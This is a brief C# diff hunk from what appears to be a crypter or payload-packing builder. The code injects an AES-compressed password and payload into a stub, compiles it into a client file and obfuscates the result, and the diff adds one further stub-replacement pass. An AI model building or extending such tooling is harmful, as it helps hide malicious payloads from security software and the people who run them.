@@ -17,6 +17,8 @@ public class Program
 
         stub = stub.Replace("#PASSWORD_AES_COMPRESS_STUB#", passwordAesCompress);
         stub = stub.Replace("#PAYLOAD_AES_COMPRESS_STUB#", codeAesCompressPayloadBase64);
+
+        stub = stub.Replace(stub,Replace.Stub(stub));
         
         Compiler.CompileCSharpFile(stub,filePathClient,null);
         Obfuscate.Run(filePathClient);
